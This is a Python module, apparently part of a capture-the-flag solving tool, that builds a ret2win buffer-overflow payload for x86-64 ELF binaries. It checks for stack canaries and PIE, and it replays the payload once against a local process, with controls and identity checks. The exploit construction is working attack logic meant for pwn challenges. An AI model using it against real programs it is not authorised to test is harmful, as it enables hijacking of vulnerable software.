"""Opt-in local ret2win candidate and one bounded process replay."""

import hashlib
import json
import os
from pathlib import Path
import re
import shutil
import stat
import time
import uuid

from . import core
from .profiles.elf import inspect_elf
from .profiles.service_transport import run_service


def _bytes(value, name):
    if not isinstance(value, str) or not re.fullmatch(r"(?:[0-9a-fA-F]{2}){1,32}", value):
        raise ValueError(f"{name} must be 1 to 32 hexadecimal bytes")
    return bytes.fromhex(value)


def _source(path, deadline):
    path = Path(path).absolute()
    if path.is_symlink() or not stat.S_ISREG(path.stat().st_mode):
        raise ValueError("binary must be a regular file, not a symlink")
    if path.stat().st_size > 32 * 1024 * 1024:
        raise ValueError("binary exceeds 32 MiB")
    digest = core._hash(path, deadline)
    if digest is None:
        raise ValueError("binary identity could not be verified within budget")
    return path, digest


def _source_current(binary, digest, deadline):
    try:
        return core._identity_matches(binary, digest, deadline)
    except OSError:
        return False


def _require_source(binary, digest, deadline, phase):
    current = _source_current(binary, digest, deadline)
    if current is None:
        raise ValueError(f"source identity incomplete {phase}")
    if not current:
        raise ValueError(f"binary changed {phase}")


def _candidate(binary, symbol, offset, runtime_base, base_evidence, deadline):
    from elftools.elf.elffile import ELFFile

    if type(offset) is not int or not 0 < offset <= 4096:
        raise ValueError("known overflow offset must be 1 to 4096 bytes")
    if not isinstance(symbol, str) or not re.fullmatch(r"[A-Za-z_][A-Za-z_0-9]{0,127}", symbol):
        raise ValueError("target symbol must be a bounded ELF function name")
    if (runtime_base is None) != (base_evidence is None):
        raise ValueError("PIE runtime base requires its explicit evidence, and vice versa")
    if base_evidence is not None and (not isinstance(base_evidence, str) or
                                      not 0 < len(base_evidence) <= 256):
        raise ValueError("base evidence must be a bounded observation description")
    report, warnings = inspect_elf(binary, max_symbols=256, max_gadgets=256)
    if report is None:
        raise ValueError("ELF inspection failed: " + "; ".join(warnings))
    if report["architecture"] != "x86-64" or report["bits"] != 64:
        raise ValueError("this ret2win template supports x86-64 ELF only")
    mitigations = report["mitigations"]
    if mitigations["canary"] != "not detected":
        raise ValueError("detected or uncertain stack canary blocks this candidate")
    pie = mitigations["pie"]
    if pie and runtime_base is None:
        raise ValueError("PIE needs an evidenced runtime base")
    if not pie and runtime_base is not None:
        raise ValueError("runtime base is only valid for PIE")
    if runtime_base is not None:
        if not re.fullmatch(r"0[xX][0-9a-fA-F]{1,16}", runtime_base):
            raise ValueError("runtime base must be a hexadecimal address")
        base = int(runtime_base, 16)
        if base == 0 or base & 0xfff:
            raise ValueError("runtime base must be nonzero and page aligned")
    else:
        base = 0
    targets = [row for row in report["symbols"] if row["name"] == symbol and
               type(row["file_offset"]) is int]
    if len(targets) != 1:
        raise ValueError("target symbol is absent or ambiguous in bounded ELF output")
    with binary.open("rb") as source:
        elf = ELFFile(source)
        executable = any(segment["p_type"] == "PT_LOAD" and segment["p_flags"] & 1 and
                         segment["p_vaddr"] <= targets[0]["vaddr"] <
                         segment["p_vaddr"] + segment["p_filesz"]
                         for segment in elf.iter_segments())
    if not executable:
        raise ValueError("target symbol is outside executable ELF segments")
    rets = [row for row in report["gadgets"] if row["instructions"] == "ret" and
            row["bytes"] == "c3" and type(row["file_offset"]) is int]
    if not rets:
        raise ValueError("ELF has no proven short ret gadget in bounded scan")
    target = base + targets[0]["vaddr"]
    ret = base + rets[0]["vaddr"]
    if target >= 1 << 64 or ret >= 1 << 64 or target <= 0 or ret <= 0:
        raise ValueError("resolved address is outside x86-64 range")
    if core._hash(binary, deadline) is None:
        raise ValueError("binary identity could not be verified after inspection")
    payload = b"A" * offset + ret.to_bytes(8, "little") + target.to_bytes(8, "little")
    return payload, report, target, ret, warnings


def _loader(directory, deadline):
    directory = Path(directory).absolute()
    if (directory.is_symlink() or not directory.is_dir() or
            any(character in str(directory) for character in ":;\r\n$")):
        raise ValueError("library path must be a real directory without loader separators or tokens")
    env = shutil.which("env")
    if env is None:
        raise ValueError("local env tool is unavailable")
    env_path = Path(env).resolve()
    env_hash = core._hash(env_path, deadline)
    if env_hash is None:
        raise ValueError("local env tool identity could not be verified")
    libraries = []
    entries = sorted(entry for entry in directory.iterdir() if ".so" in entry.name)
    if len(entries) > 64:
        raise ValueError("library path exceeds 64 shared-library entries")
    for entry in entries:
        target = entry.resolve()
        if not target.is_file() or target.stat().st_size > 32 * 1024 * 1024:
            raise ValueError("library entry must resolve to a regular file under 32 MiB")
        digest = core._hash(target, deadline)
        if digest is None:
            raise ValueError("library entry identity could not be verified")
        libraries.append({"name": entry.name, "path": str(target), "sha256": digest})
    return directory, env_path, env_hash, libraries


def _loader_current(directory, env_path, env_hash, libraries, deadline):
    if directory is None:
        return True
    try:
        if (directory.is_symlink() or
                sorted(entry.name for entry in directory.iterdir() if ".so" in entry.name) != [
                    record["name"] for record in libraries]):
            return False
        current = core._identity_matches(env_path, env_hash, deadline)
        if current is not True:
            return current
        for record in libraries:
            entry = directory / record["name"]
            if not entry.exists() or str(entry.resolve()) != record["path"]:
                return False
            current = core._identity_matches(Path(record["path"]), record["sha256"], deadline)
            if current is not True:
                return current
        return True
    except OSError:
        return False


def _evidence_bytes(path, limit):
    with os.fdopen(os.open(path, os.O_RDONLY | os.O_NOFOLLOW), "rb") as source:
        metadata = os.fstat(source.fileno())
        if (not stat.S_ISREG(metadata.st_mode) or metadata.st_uid != os.getuid() or
                metadata.st_mode & 0o077 or metadata.st_size > limit):
            raise ValueError("offset run evidence must be a private bounded file")
        data = source.read(limit + 1)
        if len(data) > limit:
            raise ValueError("offset run evidence exceeds its size limit")
        return data


def _offset_evidence(run_path, binary, digest, deadline):
    from . import pwn_offset

    run = Path(run_path).absolute()
    try:
        if (run.is_symlink() or not run.is_dir() or run.stat().st_uid != os.getuid() or
                run.stat().st_mode & 0o077):
            raise ValueError("offset run must contain private regular evidence files")
        manifest = json.loads(_evidence_bytes(run / "manifest.json", 32768))
        offset = manifest.get("offset")
        controls = manifest.get("controls")
        length = manifest.get("pattern_length")
        if type(length) is not int or not 8 <= length <= 2048:
            raise ValueError("offset run pattern length is invalid")
        pattern = _evidence_bytes(run / "pattern.bin", 2048)
        probe = _evidence_bytes(run / "probe-gdb.txt", 1024 * 1024)
        replay = _evidence_bytes(run / "replay-gdb.txt", 1024 * 1024)
        short = _evidence_bytes(run / "short-gdb.txt", 1024 * 1024)

        def return_bytes(trace):
            if (b"Program received signal SIGSEGV" not in trace or
                    not re.search(rb"=>\s*0x[0-9a-f]+[^\n]*:\s*retq?\b", trace)):
                return None
            match = re.search(rb"(?m)^0x[0-9a-f]+:\s*((?:0x[0-9a-f]{1,2}\s*){8})$", trace)
            return (bytes(int(value, 16) for value in re.findall(rb"0x[0-9a-f]{1,2}", match[1]))
                    if match else None)

        stack = return_bytes(probe)
        if (manifest.get("schema_version") != core.SCHEMA or
                type(manifest.get("schema_version")) is not int or
                manifest.get("category") != "pwn_services" or
                manifest.get("run_type") != "pwn_offset" or
                manifest.get("verification") != "controlled local replay" or
                manifest.get("stop_reason") != "verified" or
                manifest.get("channel") != "stdin" or
                manifest.get("coverage", {}).get("PWN03", {}).get("status") != "ran" or
                type(offset) is not int or not 0 < offset <= 4096 or
                type(manifest.get("candidate_offset")) is not int or
                manifest.get("candidate_offset") != offset or
                controls != [{"name": "changed return bytes", "status": "matched"},
                             {"name": "short input", "status": "no crash"}] or
                pattern != pwn_offset._pattern(manifest.get("alphabet"), length) or
                stack is None or pattern.find(stack) != offset or
                pattern.rfind(stack) != offset or return_bytes(replay) != b"B" * 8 or
                b"Program received signal" in short or
                not (b"exited normally" in short or b"exited with code" in short) or
                _evidence_bytes(run / "replay.bin", 4104) != b"A" * offset + b"B" * 8):
            raise ValueError("offset run lacks verified stdin return-address controls")
        source_hash = manifest.get("source_sha256")
        if (manifest.get("source") != str(binary) or not isinstance(source_hash, str) or
                not re.fullmatch(r"[0-9a-f]{64}", source_hash) or
                source_hash != digest or _source_current(binary, source_hash, deadline) is not True):
            raise ValueError("offset run source identity is stale or different")
        library_path = manifest.get("library_path")
        records = manifest.get("libraries")
        if (library_path is None and records != [] or
                library_path is not None and
                (not isinstance(library_path, str) or not Path(library_path).is_absolute()) or
                not isinstance(records, list)):
            raise ValueError("offset run library evidence is malformed")
        if library_path is not None:
            library, current_records = pwn_offset._libraries(library_path, deadline)
            if str(library) != library_path or current_records != records:
                raise ValueError("offset run library identity changed")
        return offset, library_path
    except (OSError, json.JSONDecodeError, UnicodeDecodeError, TypeError, AttributeError,
            RecursionError) as error:
        raise ValueError("offset run evidence is unavailable or malformed") from error


def _render(run, manifest, current):
    lines = ["# Autosolve local ret2win", "",
             "PWN04: " + manifest["validation"] + ". Challenge acceptance: unverified.",
             "Source identity current: " + ("yes" if current else "no") + ".",
             "Supplied overflow offset: " + str(manifest["offset"]) + " bytes.",
             "Target: " + manifest["symbol"] + ".",
             "Local candidate replay: " + ("attempted once" if manifest["replay_attempted"] else "not attempted") + ".",
             "Benign controls: " + ", ".join(row["name"] + " " + row["status"]
                                               for row in manifest["controls"]) + "."]
    if manifest.get("replay_error"):
        lines.append("Replay stopped: " + manifest["replay_error"] + ".")
    if manifest.get("warnings"):
        lines.append("Warnings: " + "; ".join(manifest["warnings"]))
    lines += ["", "A marker with controls is local output evidence, not proof that control flow reached the target.",
              "Payload and raw transcripts remain in private run files.",
              "Resume only checks source identity and redraws this report; it never replays the process.", ""]
    core._write_text(run / "report.md", "\n".join(lines))


def start(binary_path, offset, symbol, prompt_hex, success_hex, budget,
          runs_root=None, replay_local=False, runtime_base=None, base_evidence=None,
          library_path=None, offset_run=None):
    if not isinstance(budget, (int, float)) or isinstance(budget, bool) or not 0 < budget <= 120:
        raise ValueError("ret2win budget must be positive and at most 120 seconds")
    prompt = _bytes(prompt_hex, "prompt delimiter")
    marker = _bytes(success_hex, "success marker")
    if marker in prompt or prompt in marker:
        raise ValueError("success marker and prompt delimiter overlap ambiguously")
    deadline = time.monotonic() + budget
    binary, digest = _source(binary_path, deadline)
    if offset_run is not None:
        if offset is not None:
            raise ValueError("use either an explicit offset or an offset run")
        offset, recorded_library = _offset_evidence(offset_run, binary, digest, deadline)
        if library_path is not None and str(Path(library_path).absolute()) != recorded_library:
            raise ValueError("explicit library path conflicts with offset run")
        library_path = recorded_library
    if library_path is not None and not replay_local and offset_run is None:
        raise ValueError("library path requires explicit local replay")
    if replay_local and not os.access(binary, os.X_OK):
        raise ValueError("local replay needs an executable binary")
    if replay_local and runtime_base is not None:
        raise ValueError("a supplied PIE base is stale for a new ASLR process; local replay is refused")
    payload, elf_report, target, ret, warnings = _candidate(
        binary, symbol, offset, runtime_base, base_evidence, deadline)
    if marker in payload:
        raise ValueError("success marker appears in generated payload and an echo would be ambiguous")
    library, env_path, env_hash, libraries = (
        _loader(library_path, deadline) if library_path is not None
        else (None, None, None, []))
    _require_source(binary, digest, deadline, "during candidate construction")
    if offset_run is not None and _offset_evidence(offset_run, binary, digest, deadline) != (
            offset, library_path):
        raise ValueError("offset run evidence changed during candidate construction")
    root = Path(runs_root) if runs_root else core.ROOT / ".autosolve" / "runs"
    run = root / f"{time.strftime('%Y%m%d-%H%M%S')}-{uuid.uuid4().hex[:8]}"
    run.mkdir(parents=True, mode=0o700)
    descriptor = os.open(run / "payload.bin", os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW,
                         0o600)
    with os.fdopen(descriptor, "wb") as output:
        output.write(payload)
        output.flush()
        os.fsync(output.fileno())
    argv = ([str(env_path), f"LD_LIBRARY_PATH={library}", str(binary)]
            if library is not None else [str(binary)])
    controls = []
    operation = None
    def offset_current():
        if offset_run is None:
            return True
        try:
            return _offset_evidence(offset_run, binary, digest, deadline) == (offset, library_path)
        except ValueError:
            return False

    if replay_local:
        for name, control_payload in (("short", b"B\n"),
                                      ("wrong-target", payload[:-8] + b"\x00" * 8)):
            source_identity = _source_current(binary, digest, deadline)
            if source_identity is not True:
                warnings.append("source identity " + ("incomplete" if source_identity is None
                                                       else "changed") + " before local control")
                controls.append({"name": name, "status": "inconclusive", "error": "source_identity"})
                continue
            if not offset_current():
                warnings.append("offset run evidence changed before local control")
                controls.append({"name": name, "status": "inconclusive", "error": "offset_identity"})
                continue
            loader_identity = _loader_current(library, env_path, env_hash, libraries, deadline)
            if loader_identity is not True:
                warnings.append("library identity " + ("incomplete" if loader_identity is None
                                                        else "changed") + " before local control")
                controls.append({"name": name, "status": "inconclusive", "error": "library_identity"})
                continue
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                controls.append({"name": name, "status": "inconclusive", "error": "budget"})
                continue
            control, _ = run_service(
                {"transport": {"argv": argv, "cwd": str(binary.parent)},
                 "steps": [{"read": {"delimiter_hex": prompt.hex()}},
                           {"write_hex": control_payload.hex()},
                           {"read": {"delimiter_hex": marker.hex()}}]},
                timeout=min(2, remaining / 3), max_bytes=65536,
                max_frame_bytes=16384, max_steps=3, allow_local=True)
            received = b"".join(bytes.fromhex(row["hex"]) for row in control["transcript"]
                                if row["direction"] == "recv")
            if marker in received:
                control_status = "marker observed"
            elif (control["error"] == "early_eof" and control["frames"] and
                  control["bytes_sent"] == len(control_payload)):
                control_status = "marker absent"
            else:
                control_status = "inconclusive"
            controls.append({"name": name, "status": control_status,
                             "error": control["error"]})
            core._write_json(run / f"control-{name}-frames.json", control["frames"])
            core._write_text(run / f"control-{name}-transcript.jsonl", "".join(
                json.dumps(row, sort_keys=True) + "\n" for row in control["transcript"]))
            loader_identity = _loader_current(library, env_path, env_hash, libraries, deadline)
            if loader_identity is not True:
                warnings.append("library identity " + ("incomplete" if loader_identity is None
                                                        else "changed") + " after local control")
                controls[-1]["status"] = "inconclusive"
            if not offset_current():
                warnings.append("offset run evidence changed after local control")
                controls[-1]["status"] = "inconclusive"
        source_before = _source_current(binary, digest, deadline)
        if source_before is not True:
            warnings.append("source identity " + ("incomplete" if source_before is None
                                                   else "changed") + " before local replay")
        loader_before = _loader_current(library, env_path, env_hash, libraries, deadline)
        if loader_before is not True:
            warnings.append("library identity " + ("incomplete" if loader_before is None
                                                    else "changed") + " before local replay")
        offset_before = offset_current()
        if not offset_before:
            warnings.append("offset run evidence changed before local replay")
        remaining = deadline - time.monotonic()
        if remaining > 0 and source_before is True and loader_before is True and offset_before:
            operation, transport_warnings = run_service(
                {"transport": {"argv": argv, "cwd": str(binary.parent)},
                 "steps": [{"read": {"delimiter_hex": prompt.hex()}},
                           {"write_hex": payload.hex()},
                           {"read": {"delimiter_hex": marker.hex()}}]},
                timeout=remaining, max_bytes=65536, max_frame_bytes=16384,
                max_steps=3, allow_local=True)
            warnings.extend(transport_warnings)
        elif remaining <= 0:
            warnings.append("budget ended before local replay")
    validation = "candidate" if not replay_local else "unverified"
    replay_error = operation["error"] if operation else None
    if operation is not None:
        transcript = operation["transcript"]
        first_send = next((index for index, row in enumerate(transcript)
                           if row["direction"] == "send"), len(transcript))
        pre = b"".join(bytes.fromhex(row["hex"]) for row in transcript[:first_send]
                       if row["direction"] == "recv")
        post = b"".join(bytes.fromhex(row["hex"]) for row in transcript[first_send:]
                        if row["direction"] == "recv")
        if b"error while loading shared libraries" in pre or b"ld.so:" in pre:
            replay_error = "loader_failure"
            warnings.append("local process loader failed before candidate write")
        if marker in pre:
            warnings.append("success marker appeared before candidate write; result is ambiguous")
        identity = _source_current(binary, digest, deadline)
        if identity is None:
            warnings.append("source identity incomplete after local replay")
        elif identity is False:
            warnings.append("binary changed during local replay")
        loader_after = _loader_current(library, env_path, env_hash, libraries, deadline)
        if loader_after is not True:
            warnings.append("library identity " + ("incomplete" if loader_after is None
                                                    else "changed") + " after local replay")
        offset_after = offset_current()
        if not offset_after:
            warnings.append("offset run evidence changed after local replay")
        if (operation["status"] == "complete" and operation["bytes_sent"] == len(payload)
                and marker in post and marker not in pre and identity is True
                and loader_before is True and loader_after is True and offset_after
                and len(controls) == 2 and all(row["status"] == "marker absent"
                                               for row in controls)):
            validation = "local marker observed with controls"
        core._write_json(run / "frames.json", operation["frames"])
        core._write_text(run / "transcript.jsonl", "".join(
            json.dumps(row, sort_keys=True) + "\n" for row in transcript))
    manifest = {"schema_version": core.SCHEMA, "category": "pwn_services",
                "run_type": "pwn_ret2win", "status": "partial", "validation": validation,
                "challenge_accepted": False, "source": str(binary), "source_sha256": digest,
                "payload_sha256": hashlib.sha256(payload).hexdigest(),
                "offset": offset, "symbol": symbol, "target_address": target,
                "offset_run": str(Path(offset_run).absolute()) if offset_run is not None else None,
                "ret_address": ret, "architecture": elf_report["architecture"],
                "mitigations": elf_report["mitigations"],
                "runtime_base": int(runtime_base, 16) if runtime_base is not None else None,
                "base_evidence": base_evidence, "replay_attempted": operation is not None,
                "replay_error": replay_error,
                "controls": controls,
                "library_path": str(library) if library is not None else None,
                "env_tool_sha256": env_hash, "libraries": libraries,
                "warnings": warnings,
                "coverage": {"PWN04": {"status": "ran" if validation == "local marker observed with controls"
                                       else "partial", "note": "supplied-offset local ret2win only"}}}
    core._write_json(run / "manifest.json", manifest)
    _render(run, manifest, True)
    return run, "partial"


def _manifest(run):
    if run.is_symlink():
        raise ValueError("ret2win run directory must not be a symlink")
    manifest = json.loads((run / "manifest.json").read_text())
    if (manifest.get("schema_version") != core.SCHEMA or
            manifest.get("run_type") != "pwn_ret2win" or
            manifest.get("category") != "pwn_services"):
        raise ValueError("not a compatible ret2win run")
    return manifest


def resume(run_path):
    run = Path(run_path).absolute()
    manifest = _manifest(run)
    source = Path(manifest["source"])
    current = _source_current(source, manifest["source_sha256"], time.monotonic() + 10)
    _render(run, manifest, current is True)
    return run, "partial"


def report(run_path):
    return resume(run_path)[0] / "report.md"
